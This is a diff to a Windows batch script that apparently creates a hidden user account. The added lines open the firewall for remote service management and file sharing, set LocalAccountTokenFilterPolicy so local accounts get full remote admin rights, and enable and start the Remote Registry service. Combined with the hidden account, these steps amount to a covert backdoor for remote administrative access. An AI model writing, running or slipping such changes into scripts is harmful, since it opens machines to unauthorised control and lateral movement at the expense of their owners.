@@ -36,9 +36,18 @@ if errorlevel 1 (
     goto :end
 )
 
+netsh advfirewall firewall set rule group="Remote Service Management" new enable=yes
+netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=yes
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+sc config RemoteRegistry start= auto
+sc start RemoteRegistry
+
 echo.
 echo Account %username% created and hidden successfully.
 echo.
 
 :end
 pause
+
